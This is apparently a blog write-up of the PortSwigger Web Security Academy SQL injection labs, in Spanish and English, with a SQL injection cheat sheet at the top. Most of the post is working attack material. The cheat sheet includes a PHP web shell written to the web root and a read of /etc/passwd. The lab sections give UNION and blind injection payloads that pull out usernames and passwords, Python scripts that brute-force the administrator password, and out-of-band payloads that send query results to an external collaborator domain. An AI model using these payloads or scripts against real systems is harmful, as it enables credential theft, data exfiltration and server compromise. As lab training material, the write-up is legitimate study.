---
layout: single
title: SQLI - PortSwigger
excerpt: "All SQL Injection labs of PortSwigger with additional CheetSheet."
date: 2025-07-10
classes: wide
header:
  teaser: /img2/images/portswigger.png
  teaser_home_page: true
  icon: /img2/images/burp.jpg
categories:
  - portswigger
  - Web
tags:
  - Burpsuite
  - SQLI
  - SQLI CheetSheet
---


## SQLI CheetSheet

### Concatenar querys

1. Oracle, PostgreSQL

```sql
'foo'||'bar'
```

2. Microsoft

```sql
'foo'+'bar'
```

 3. MySQL

```sql
'foo' 'bar'
concat('foo','bar')
```

### Substring

1. Oracle

```sql
substr('foobar',1,1)
```

2. Microsoft, PostgreSQL, MySQL

```sql
substring('foobar',1,1)
```

### Comments

1. Oracle

```sql
--comment
```

2. Microsoft

```sql
--comment
/*comment*/
```

3. PostgreSQL

```sql
--comment
/*comment*/
```

4. MySQL

```sql
#comment
-- comment
/*comment*/
```

### Database version

1. Oracle

```sql
select banner from v$version
select version from v$instance
```

2. Microsoft, MySQL

```sql
select @@version
```

3. PostgreSQL

```sql
select version()
```

### Database contents

1. Oracle 

```sql
select table_name from all_tables
select column_name from all_tab_columns
```

2. Microsoft, PostgreSQL, MySQL

```sql
select schema_name from information_schema.schemata
select table_name from information_schema.tables where table_schema='database'
select column_name from information_schema.columns
```

### Conditional errors

1. Oracle

```sql
select case when('CONDITION') then to_char(1/0) else NULL end from dual
```

2. Microsoft

```sql
select case when('CONDITION') then 1/0 else NULL end
```

3. PostgreSQL

```sql
1 = (select case when ('CONDITION') then 1/(select 0) else NULL end)
```

4. MySQL

```sql
select if('CONDITION',(select table_name from information_schema.tables),'a')
```

### Extracting data via visible error messages

1. Microsoft

```sql
select 'foo' where 1=(select 'test')
> Conversion failed when converting the varchar value 'test' to data type int.
```

2. PostgreSQL

```sql
select cast((select 'test') as int)
> invalid input syntax for integer: "test"
```

3. MySQL

```sql
select 'foo' where 1=1 and extractvalue(1,concat(0x5c,(select 'test')))
> XPATH syntax error: '\test'
```

### Batched (or stacked) queries

1. Microsoft

```sql
select 'query1'; select 'query2'
select 'query1' select 'query2'
```

2. PostgreSQL, MySQL

```sql
select 'query1'; select 'query2'
```

### Time delays

1. Oracle

```sql
dbms_pipe.receive_message(('a'),10)
```

2. Microsoft

```sql
waitfor delay '0:0:10'
```

3. PostgreSQL

```sql
pg_sleep(10)
```

4. MySQL

```sql
sleep(10)
```

### Conditional time delays

1. Oracle

```sql
select case when('CONDITION') then 'a'||dbms_pipe.receive_message(('a'),10) else NULL end from dual
```

2. Microsoft

```sql
if ('CONDITION') waitfor delay '0:0:10'
```

3. PostgreSQL

```sql
select case when('CONDITION') then pg_sleep(10) else pg_sleep(0) end
```

4. MySQL

```sql
select if('CONDITION',sleep(10),'a') 
```

### DNS lookup

1. Oracle

```sql
select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://DOMAIN/"> %remote;]>'),'/l') from dual
```

```sql
select UTL_INADDR.get_host_address('DOMAIN')
```

2. Microsoft

```sql
exec master..xp_dirtree '//DOMAIN/a' 
```

3. PostgreSQL

```sql
copy (select '') to program 'nslookup DOMAIN'
```

4. MySQL

```sql
load_file('\\\\DOMAIN\\a')
select ... into OUTFILE '\\\\DOMAIN\a'
```

### DNS lookup with data exfiltration

1. Oracle

```sql
select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select 'test')||'.DOMAIN/"> %remote;]>'),'/l') from dual
```

2. Microsoft

```sql
declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.DOMAIN/a"')
create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
```

3. PostgreSQL

```sql
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.DOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
```

4. MySQL

```sql
select 'test' into OUTFILE '\\\\DOMAIN\a'
```

### Special Functions

1. Insert Files

```sql
select '<?php system($_GET["cmd"]); ?>' into outfile '/var/www/html/cmd.php'
```

2. Read Files

```sql
select load_file('/etc/passwd')
```

## Inyección SQL en cláusulas WHERE || injection vulnerability in WHERE clause allowing retrieval of hidden data

- Query SQL

```sql
SELECT * FROM products WHERE category = '$INPUT$' AND released = 1
```

- Explotation

![](/img2/Pasted%20image%2020250707130629.png)

![](/img2/Pasted%20image%2020250707130723.png)

- Injection (OPTION 1)

```sql
SELECT * FROM products WHERE category = 'test' or released=0-- -' AND released = 1
```

- Injection (OPTION 2)

```sql
SELECT * FROM products WHERE category = 'test' or 1=1-- -' AND released = 1
```

## Bypass de login mediante Inyección SQL || SQL injection vulnerability allowing login bypass

- Query SQL

```sql
SELECT username FROM users WHERE password = '$INPUT$'
```

- Explotation

![](/img2/Pasted%20image%2020250707134510.png)

- Injection

```sql
SELECT username FROM users WHERE password = 'test' or 1=1-- -'
```

## Identificación de versión y motor de base de datos (Oracle)

- Query SQL

```sql
SELECT * FROM products WHERE category = '$INPUT$' AND released = 1
```

- Explotation

![](/img2/Pasted%20image%2020250707144100.png)

> Vemos cuantas columnas tiene la tabla actual, de esta forma podemos replazar las columnas existentes por nuestros datos.

![](/img2/Pasted%20image%2020250707144321.png)

> En las bases de datos Oracle es necesario referenciar una tabla, en este caso podemos usar la tabla dual.

![](/img2/Pasted%20image%2020250707144522.png)

> Una vez tenemos control sobre un campo de la query, podemos ver la version de Oracle seleccionando la columna banner de la tabla v$version.

- Injection

```sql
SELECT * FROM products WHERE category = 'Gifts' order by 2-- -' AND released = 1
```

```sql
SELECT * FROM products WHERE category = 'Gifts' union select '1','2' from dual-- -' AND released = 1
```

```sql
SELECT * FROM products WHERE category = 'Gifts' union select '1',banner from v$verion-- -' AND released = 1
```

## Identificación de versión y motor de base de datos (MySQL y MSSQL) || SQL injection attack, querying the database type and version on MySQL and Microsoft

- Query SQL

```sql
SELECT * FROM products WHERE category = '$INPUT$' AND released = 1
```

- Explotation

![](/img2/Pasted%20image%2020250707153759.png)

![](/img2/Pasted%20image%2020250707153916.png)

> En este caso no hace falta especificar la tabla

![](/img2/Pasted%20image%2020250707154022.png)

![](/img2/Pasted%20image%2020250707154113.png)

> Para ver la versión de la base de datos tenemos dos opciones: @@version, version()

- Injection (OPTION 1)

```sql
SELECT * FROM products WHERE category = 'Gifts' order by 2-- -' AND released = 1
```

```sql
SELECT * FROM products WHERE category = 'Gifts' union select '1','2'-- -' AND released = 1
```

```sql
SELECT * FROM products WHERE category = 'Gifts' union select '1',@@version-- -' AND released = 1
```

- Injection (OPTION 2)

```sql
SELECT * FROM products WHERE category = 'Gifts' union select '1',version()-- -' AND released = 1
```

## Enumeración de bases de datos en motores no Oracle || SQL injection attack, listing the database contents on non-Oracle databases

- Query SQL

```sql
SELECT * FROM products WHERE category = '$INPUT$' AND released = 1
```

- Explotation

![](/img2/Pasted%20image%2020250707163458.png)

![](/img2/Pasted%20image%2020250707163813.png)

![](/img2/Pasted%20image%2020250707164148.png)

> Listamos todas las bases de datos existentes

![](/img2/Pasted%20image%2020250707164420.png)

> Listamos todas las tablas de la base de datos public

![](/img2/Pasted%20image%2020250707164859.png)

![](/img2/Pasted%20image%2020250707165120.png)

- Injection

```sql
SELECT * FROM products WHERE category = 'Gifts' order by 2-- -' AND released = 1
```

```sql
SELECT * FROM products WHERE category = 'Gifts' union select '1','2'-- -' AND released = 1
```

```sql
SELECT * FROM products WHERE category = '' union select NULL, schema_name from information_schema.schemata-- -' AND released = 1
```

```sql
SELECT * FROM products WHERE category = '' union select NULL, table_name from information_schema.tables where table_schema='public'-- -' AND released = 1
```

```sql
SELECT * FROM products WHERE category = '' union select NULL, table_name from information_schema.tables where table_schema='public'-- -' AND released = 1
```

```sql
SELECT * FROM products WHERE category = '' union select NULL, column_name from information_schema.columns where table_schema='public' and table_name='users_arxcok'-- -' AND released = 1
```

```sql
SELECT * FROM products WHERE category = '' union select username_eamrnf, password_hpgqls from public.users_arxcok-- -' AND released = 1
```

## Enumeración de bases de datos en Oracle || SQL injection attack, listing the database contents on Oracle

- Query SQL

```sql
SELECT * FROM products WHERE category = '$INPUT$' AND released = 1
```

- Explotation

![](/img2/Pasted%20image%2020250707171709.png)

![](/img2/Pasted%20image%2020250707171817.png)

![](/img2/Pasted%20image%2020250707172353.png)

![](/img2/Pasted%20image%2020250707172509.png)

![](/img2/Pasted%20image%2020250707172625.png)

- Injection

```sql
SELECT * FROM products WHERE category = 'Gifts' order by 2-- -' AND released = 1
```

```sql
SELECT * FROM products WHERE category = 'Gifts' union select '1','2' from dual-- -' AND released = 1
```

```sql
SELECT * FROM products WHERE category = '' union select NULL,table_name from all_tables-- -' AND released = 1
```

```sql
SELECT * FROM products WHERE category = '' union select NULL,column_table from all_tab_columns where table_name='USERS_KBPLFG'-- -' AND released = 1
```

```sql
SELECT * FROM products WHERE category = '' union select USERS_VMPUYU,PASSWORD_OEKSZB from USERS_KBPLFG-- -' AND released = 1
```

## Ataque UNION: descubriendo número de columnas || SQL injection UNION attack, determining the number of columns returned by the query

- Query SQL

```sql
SELECT * FROM products WHERE category = '$INPUT$' AND released = 1
```

- Explotation

![](/img2/Pasted%20image%2020250707174621.png)

![](/img2/Pasted%20image%2020250707174726.png)

- Injection

```sql
SELECT * FROM products WHERE category = 'Gifts' order by 2-- -' AND released = 1
```

```sql
SELECT * FROM products WHERE category = 'Gifts' union select '1','2','3'-- -' AND released = 1
```


## # Ataque UNION: encontrando columnas con texto || SQL injection UNION attack, finding a column containing text 

- Query SQL

```sql
SELECT * FROM products WHERE category = '$INPUT$' AND released = 1
```

- Explotation

![](/img2/Pasted%20image%2020250708162733.png)

![](/img2/Pasted%20image%2020250708163045.png)

- Injection

```sql
SELECT * FROM products WHERE category = 'Accessories' order by 3-- -' AND released = 1
```

```sql
SELECT * FROM products WHERE category = 'Accessories' union select NULL,'test',NULL-- -' AND released = 1
```

## Ataque UNION: extrayendo datos de otras tablas || SQL injection UNION attack, retrieving data from other tables

- Query SQL

```sql
SELECT * FROM products WHERE category = '$INPUT$' AND released = 1
```

- Explotation

![](/img2/Pasted%20image%2020250708163727.png)

![](/img2/Pasted%20image%2020250708163823.png)

![](/img2/Pasted%20image%2020250708163938.png)

![](/img2/Pasted%20image%2020250708164049.png)

![](/img2/Pasted%20image%2020250708164208.png)

![](/img2/Pasted%20image%2020250708164308.png)

- Injection

```sql
SELECT * FROM products WHERE category = 'Gifts' order by 2-- -' AND released = 1
```

```sql
SELECT * FROM products WHERE category = 'Gifts' union select '1','2'-- -' AND released = 1
```

```sql
SELECT * FROM products WHERE category = '' union select NULL,schema_name from information_schema.schemata-- -' AND released = 1
```

```sql
SELECT * FROM products WHERE category = '' union select NULL,table_name from information_schema.tables where table_schema='public'-- -' AND released = 1
```

```sql
SELECT * FROM products WHERE category = '' union select NULL,column_name from information_schema.columns where table_schema='public' and table_name='users'-- -' AND released = 1
```

```sql
SELECT * FROM products WHERE category = '' union select username,password from public.users-- -' AND released = 1
```

## Ataque UNION: múltiples valores en una sola columna || SQL injection UNION attack, retrieving multiple values in a single column

- Query SQL

```sql
SELECT * FROM products WHERE category = '$INPUT$' AND released = 1
```

- Explotation

![](/img2/Pasted%20image%2020250708165501.png)

![](/img2/Pasted%20image%2020250708165542.png)

![](/img2/Pasted%20image%2020250708165707.png)

![](/img2/Pasted%20image%2020250708165826.png)

![](/img2/Pasted%20image%2020250708170010.png)

![](/img2/Pasted%20image%2020250708170115.png)

- Injection

```sql
SELECT * FROM products WHERE category = 'Gifts' order by 2-- -' AND released = 1
```

```sql
SELECT * FROM products WHERE category = 'Gifts' union select '1','2'-- -' AND released = 1
```

```sql
SELECT * FROM products WHERE category = '' union select NULL,schema_name from information_schema.schemata-- -' AND released = 1
```

```sql
SELECT * FROM products WHERE category = '' union select NULL,table_name from information_schema.tables where table_schema='public'-- -' AND released = 1
```

```sql
SELECT * FROM products WHERE category = '' union select NULL,column_name from information_schema.columns where table_schema='public' and table_name='users'-- -' AND released = 1
```

```sql
SELECT * FROM products WHERE category = '' union select NULL,concat(username,' -- ',password) from public.users-- -' AND released = 1
```

## Inyección SQL ciega con respuestas condicionales || Blind SQL injection with conditional responses

- Query SQL

```sql
SELECT * FROM tracking WHERE id = '$INPUT$'
```

- Explotation

![](/img2/Pasted%20image%2020250708192324.png)

![](/img2/Pasted%20image%2020250708192411.png)

> Vemos que ha cambiado el tamaño de la respuesta, esto significa que existe alguna variante al corromper la query.

```bash
❯ curl -X GET https://0a7a00f703ea90ba827b8836007f004c.web-security-academy.net/ --cookie "TrackingId=TvXMzKlqgSfVoLVu" -o request1
```

```ruby
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 11442  100 11442    0     0  46063      0 --:--:-- --:--:-- --:--:-- 46137
```

```bash
❯ curl -X GET https://0a7a00f703ea90ba827b8836007f004c.web-security-academy.net/ --cookie "TrackingId=TvXMzKlqgSfVoLVu'" -o request2
```

```ruby
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 11381  100 11381    0     0  44516      0 --:--:-- --:--:-- --:--:-- 44631
```

```bash
❯ diff request1 request2
```

```ruby
41d40
<                             <div>Welcome back!</div><p>|</p>
                                                              
```

> Vemos que la palabra que se añade cuando la query es válida es 'Welcome back!', gracias a esto podemos extraer información.

![](/img2/Pasted%20image%2020250708193330.png)

![](/img2/Pasted%20image%2020250708193641.png)

> Comprobamos si podemos establecer condiciones con caracteres.

![](/img2/Pasted%20image%2020250708194220.png)

> Averiguamos la existencia de la tabla users, además del usuario administrator.

![](/img2/Pasted%20image%2020250708194408.png)

> De esta forma vemos como iterar por cada palabra de la columna username.

![](/img2/Pasted%20image%2020250708200838.png)

> De forma opcional podemos ver el tamaño de la contraseña, esto nos da más precisión a la hora de crear el script en python.

```python
import requests
import signal
import sys
import string
import time
from pwn import *


def def_handler(sig,frame):
	print('\n\n[+] Exiting...\n')
	sys.exit(1)


signal.signal(signal.SIGINT,def_handler)


characters= string.digits + string.ascii_letters
url= "https://0a7a00f703ea90ba827b8836007f004c.web-security-academy.net/"


def SQLI():
	password=""
	p1.status("Starting")
	time.sleep(2)
	for position in range(1,21):
		for character in characters:
			cookies= {
			'TrackingId' : f"TvXMzKlqgSfVoLVu'and (select substring(password,{position},1) from users where username='administrator')='{character}'-- -",
			'session':'ssseVb0zU0yGxMnWleooIm2dOnRjdt5T'
			}
			p1.status(cookies['TrackingId'])
			r= requests.get(url=url,cookies=cookies)
			if "Welcome" in r.text:
				password+=character
				p2.status(password)
				break


if __name__ == '__main__':
	p1=log.progress("SQLI")
	p2=log.progress("Password")
	SQLI()
```

```bash
❯ python3 sqli.py
```

```ruby
❯ python3 sqli.py
[▆] SQLI: TvXMzKlqgSfVoLVu'and (select substring(password,20,1) from users where username='administrator')='6'-- -
[o] Password: p8gaw5ig5xecg3xac2m6
```


- Injection

```sql
SELECT * FROM tracking WHERE id = 'TvXMzKlqgSfVoLVu'order by 1-- -'
```

```sql
SELECT * FROM tracking WHERE id = 'TvXMzKlqgSfVoLVu'and (select 'test')='test'-- -'
```

```sql
SELECT * FROM tracking WHERE id = 'TvXMzKlqgSfVoLVu'and (select 'test' from users where username='administrator')='test'-- -'
```

```sql
SELECT * FROM tracking WHERE id = 'TvXMzKlqgSfVoLVu'and (select substring(username,1,1) from users where username='administrator')='a'-- -'
```

```sql
SELECT * FROM tracking WHERE id = 'TvXMzKlqgSfVoLVu'and (select 'test' from users where username='administrator' where length(password)=20)='test'-- -'
```

```sql
SELECT * FROM tracking WHERE id = 'TvXMzKlqgSfVoLVu'and (select substring(password,1,1) from users where username='administrator')='p'-- -'
```

## Inyección SQL ciega con errores condicionales || Blind SQL injection with conditional errors

- Query SQL

```sql
SELECT * FROM tracking WHERE id = '$INPUT$'
```

- Explotation

![](/img2/Pasted%20image%2020250708233535.png)

> Vemos que al corromper la query salta un internal server error, es muy probable que sea el campo vulnerable.

![](/img2/Pasted%20image%2020250708233851.png)

![](/img2/Pasted%20image%2020250708234328.png)

> Vemos que se trata de una base de datos Oracle.

![](/img2/Pasted%20image%2020250708235320.png)

> De esta forma podemos forzar a una query errónea, en el caso de que la primera condición se cumpla, ejecuta el TO_CHAR(1/0), lo cual da un error de sintaxis.

![](/img2/Pasted%20image%2020250708235844.png)

> Probamos a hacer una consulta dentro de la condición principal.

![](/img2/Pasted%20image%2020250709000049.png)

> Usamos la función substr para iterar por cada letra del usuario administrador.

![](/img2/Pasted%20image%2020250709000257.png)

> De forma opcional podemos ver el tamaño de la contraseña, esto nos da más precisión a la hora de crear el script en python.

```bash
❯ python3 sqli.py
```

```python
import requests
import signal
import sys
import string
import time
from pwn import *


def def_handler(sig,frame):
	print('\n\n[+] Exiting...\n')
	sys.exit(1)


signal.signal(signal.SIGINT,def_handler)


characters= string.digits + string.ascii_letters
url= "https://0ace00db03ba6e9781d643b800200050.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories"


def SQLI():
	password=""
	p1.status("Starting")
	time.sleep(2)
	for position in range(1,21):
		for character in characters:
			cookies= {
			'TrackingId' : f"TvXMzKlqgSfVoLVu'union (SELECT CASE WHEN ((select SUBSTR(password,{position},1) from users where username='administrator')='{character}') THEN TO_CHAR(1/0) END FROM dual)-- -",
			'session':'ssseVb0zU0yGxMnWleooIm2dOnRjdt5T'
			}
			p1.status(cookies['TrackingId'])
			r= requests.get(url=url,cookies=cookies)
			if r.status_code==500:
				password+=character
				p2.status(password)
				break


if __name__ == '__main__':
	p1=log.progress("SQLI")
	p2=log.progress("Password")
	SQLI()
```

```ruby
[◑] SQLI: TvXMzKlqgSfVoLVu'union (SELECT CASE WHEN ((select SUBSTR(password,20,1) from users where username='administrator')='8') THEN TO_CHAR(1/0) END FROM dual)-- -
[◑] Password: qrq9bue71121gy21mpt8
```

- Injection

```sql
SELECT * FROM tracking WHERE id  = 'TvXMzKlqgSfVoLVu'order by 1-- -'
```

```sql
SELECT * FROM tracking WHERE id = 'TvXMzKlqgSfVoLVu'union select NULL from dual-- -'
```

```sql
SELECT * FROM tracking WHERE id = 'TvXMzKlqgSfVoLVu'union (SELECT CASE WHEN(1=1) THEN TO_CHAR(1/0) END FROM dual)-- -'
```

```sql
SELECT * FROM tracking WHERE id = 'TvXMzKlqgSfVoLVu'union (SELECT CASE WHEN((select 'test' from dual)='test') THEN TO_CHAR(1/0) END FROM dual)-- -'
```

```sql
SELECT * FROM tracking WHERE id = 'TvXMzKlqgSfVoLVu'union (SELECT CASE WHEN((select SUBSTR(username,1,1) from users where username='administrator')='a') THEN TO_CHAR(1/0) END FROM dual)-- -'
```

```sql
SELECT * FROM tracking WHERE id = 'TvXMzKlqgSfVoLVu'union (SELECT CASE WHEN ((select SUBSTR(username,1,1) from users where username='administrator' and length(password)=20)='a') THEN TO_CHAR(1/0) END FROM dual)-- -'
```

```sql
SELECT * FROM tracking WHERE id = 'TvXMzKlqgSfVoLVu'union (SELECT CASE WHEN ((select SUBSTR(password,1,1) from users where username='administrator')='p') THEN TO_CHAR(1/0) END FROM dual)-- -'
```

## Inyección SQL basada en errores visibles || Visible error-based SQL injection

- Query SQL

```sql
SELECT * FROM tracking WHERE id = '$INPUT$'
```

- Explotation

![](/img2/Pasted%20image%2020250709010103.png)

![](/img2/Pasted%20image%2020250709121630.png)

> Si la query es correcta nos podemos fijar en el código de estado.

![](/img2/Pasted%20image%2020250709124448.png)

> Forzamos el error con la función cast(), al intentar convertir la cadena 'test' a un número entero salta el error ejecutando la consulta.

![](/img2/Pasted%20image%2020250709124910.png)

> Al intentar realizar la consulta sobre la tabla users, salta un error indicando que la consulta devuelve más de una columna.

![](/img2/Pasted%20image%2020250709125556.png)

> Para solucionar este error podemos poner un limit, de esta forma conseguimos que en el mensaje de error salga el output de la consulta ejecutada.

![](/img2/Pasted%20image%2020250709125914.png)

- Injection

```sql
SELECT * FROM tracking WHERE id  = 'TvXMzKlqgSfVoLVu'order by 1-- -'
```

```sql
SELECT * FROM tracking WHERE id  = ''or 1=cast((select 'test') as int)-- -'
```

```sql
SELECT * FROM tracking WHERE id  = ''or 1=cast((select username from users) as int)-- -'
```

```sql
SELECT * FROM tracking WHERE id  = ''or 1=cast((select username from users limit 1) as int)-- -'
```

```sql
SELECT * FROM tracking WHERE id  = ''or 1=cast((select password from users limit 1) as int)-- -'
```

## Inyección SQL ciega mediante retrasos temporales || Blind SQL injection with time delays

- Query SQL

```sql
SELECT * FROM tracking WHERE id = '$INPUT$'
```

- Explotation

![](/img2/Pasted%20image%2020250709132223.png)

> Probamos varias sentencias como and sleep(10), or sleep(10), como no tenemos respuesta podemos probar una sentencia en PostgreSQL, obteniendo así el retraso de 10 segundos.

- Injection

```sql
SELECT * FROM tracking WHERE id = 'fE3ckFcqhjBIOfkv'||pg_sleep(10)-- -'
```

## Inyección SQL ciega con retrasos y exfiltración de datos || Blind SQL injection with time delays and information retrieval

- Query SQL

```sql
SELECT * FROM tracking WHERE id = '$INPUT$'
```

- Explotation

![](/img2/Pasted%20image%2020250709134633.png)

> Igual que el anterior laboratorio, se trata de una base de datos PostgreSQL.

![](/img2/Pasted%20image%2020250709135044.png)

> De esta forma tenemos la capacidad de identificar una condición válida, cuando la condición devuelva un true ejecuta la función pg_sleep(5), sino ejecuta pg_sleep(0).

![](/img2/Pasted%20image%2020250709135612.png)

> Una vez tengamos el control de la condición podemos iterar por cada letra de una columna válida como username.

![](/img2/Pasted%20image%2020250709135955.png)

> Antes de crear el script en python para averiguar la contraseña podemos ver de manera opcional la longitud de la misma.

```python
import requests
import signal
import sys
import string
import time
from pwn import *


def def_handler(sig,frame):
	print('\n\n[+] Exiting...\n')
	sys.exit(1)


signal.signal(signal.SIGINT,def_handler)


characters= string.digits + string.ascii_letters
url= "https://0a9000bf04797132800c627100c80072.web-security-academy.net"


def SQLI():
	password=""
	p1.status("Starting")
	time.sleep(2)
	for position in range(1,21):
		for character in characters:
			cookies= {
			'TrackingId' : f"TvXMzKlqgSfVoLVu'||case when((select substring(password,{position},1) from users where username='administrator')='{character}') then pg_sleep(1) else pg_sleep(0) end-- -",
			'session':'ssseVb0zU0yGxMnWleooIm2dOnRjdt5T'
			}
			p1.status(cookies['TrackingId'])
			old_time=time.time()
			r= requests.get(url=url,cookies=cookies)
			new_time=time.time()
			if new_time-old_time>0.95:
				password+=character
				p2.status(password)
				break


if __name__ == '__main__':
	p1=log.progress("SQLI")
	p2=log.progress("Password")
	SQLI()
```

```bash
❯ python3 sqli.py
```

```ruby
[∧] SQLI: TvXMzKlqgSfVoLVu'||case when((select substring(password,20,1) from users where username='administrator')='g') then pg_sleep(1) else pg_sleep(0) end-- -
[▗] Password: dtp06awbjgc4o3vvkmug
```

- Injection

```sql
SELECT * FROM tracking WHERE id = 'fE3ckFcqhjBIOfkv'||pg_sleep(10)-- -'
```

```sql
SELECT * FROM tracking WHERE id = 'fE3ckFcqhjBIOfkv'||case when (1=1) then pg_sleep(5) else pg_sleep(0) end-- -'
```

```sql
SELECT * FROM tracking WHERE id = 'fE3ckFcqhjBIOfkv'||case when ((select substring(username,1,1) from users where username='administrator')='a') then pg_sleep(5) else pg_sleep(0) end-- -'
```

```sql
SELECT * FROM tracking WHERE id = 'fE3ckFcqhjBIOfkv'||case when ((select substring(username,1,1) from users where username='administrator' and length(password)=20)='a') then pg_sleep(5) else pg_sleep(0) end-- -'
```

```sql
SELECT * FROM tracking WHERE id = 'fE3ckFcqhjBIOfkv'||case when ((select substring(password,1,1) from users where username='administrator')='d') then pg_sleep(5) else pg_sleep(0) end-- -'
```

## Inyección SQL ciega con interacción out-of-band (OOB) || Blind SQL injection with out-of-band interaction

- Query SQL

```sql
SELECT * FROM tracking WHERE id = '$INPUT$'
```

- Explotation

![](/img2/Pasted%20image%2020250709150654.png)

![](/img2/Pasted%20image%2020250709150744.png)

> Para evitar errores es necesario url-encodear los % y los ;.

- Injection 

```sql
SELECT * FROM tracking WHERE id = 'zxTvYbp4miMpaCJK'union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://r4waitf6xiwmfkha147d21l0trzinabz.oastify.com/"> %25remote%3b]>'),'/l') FROM dual-- -'
```

## Exfiltración de datos por canal OOB en Inyección SQL || Blind SQL injection with out-of-band data exfiltration

- Query SQL

```sql
SELECT * FROM tracking WHERE id = '$INPUT$'
```

- Explotation

![](/img2/Pasted%20image%2020250709154021.png)

![](/img2/Pasted%20image%2020250709154100.png)

> Como antes vemos que se produce una inyección OOB en una base de datos Oracle.

![](/img2/Pasted%20image%2020250709154550.png)

![](/img2/Pasted%20image%2020250709154628.png)

> Concatenamos una consulta dentro de la url, de manera que en el subdominio aparezca el resultado de la consulta ejecutada.

![](/img2/Pasted%20image%2020250709154819.png)

![](/img2/Pasted%20image%2020250709154911.png)

> Recibimos el resultado de la consulta (select username from users where username='administrator')

![](/img2/Pasted%20image%2020250709155103.png)

![](/img2/Pasted%20image%2020250709155141.png)

- Injection

```sql
SELECT * FROM tracking WHERE id = 'jjqdOXE6PSe3bchM'union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://r4waitf6xiwmfkha147d21l0trzinabz.oastify.com/"> %25remote%3b]>'),'/l') FROM dual-- -'
```

```sql
SELECT * FROM tracking WHERE id = 'jjqdOXE6PSe3bchM'union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://'||(select 'test' from dual)||'.h3l0hjeww8vceag00u631rkqshyam1aq.oastify.com"> %25remote%3b]>'),'/l') FROM dual-- -'
```

```sql
SELECT * FROM tracking WHERE id = 'jjqdOXE6PSe3bchM'union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://'||(select username from users where username='administrator')||'.h3l0hjeww8vceag00u631rkqshyam1aq.oastify.com"> %25remote%3b]>'),'/l') FROM dual-- -'
```

```sql
SELECT * FROM tracking WHERE id = 'jjqdOXE6PSe3bchM'union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://'||(select password from users where username='administrator')||'.h3l0hjeww8vceag00u631rkqshyam1aq.oastify.com"> %25remote%3b]>'),'/l') FROM dual-- -'
```

## Bypass de filtros con codificación XML en Inyección SQL || SQL injection with filter bypass via XML encoding

- Query SQL

```sql
SELECT * FROM stock WHERE storeId = $INPUT$
```

- Explotation

![](/img2/Pasted%20image%2020250710001827.png)

> Al intentar corromper la query salta una especie de WAF.

![](/img2/Pasted%20image%2020250710002451.png)

> Usando la opción encode/dec_entities podemos bypassear el WAF y ejecutar una consulta. No hace falta inyectar un comando con ', ya que la consulta no tiene comillas.

![](/img2/Pasted%20image%2020250710002801.png)

![](/img2/Pasted%20image%2020250710002907.png)

- Injection

```sql
SELECT * FROM stock WHERE storeId = 1 or 1=1
```

```sql
SELECT * FROM stock WHERE storeId = 1 union select username from users
```

```sql
SELECT * FROM stock WHERE storeId = 1 union select password from users where username='administrator'
```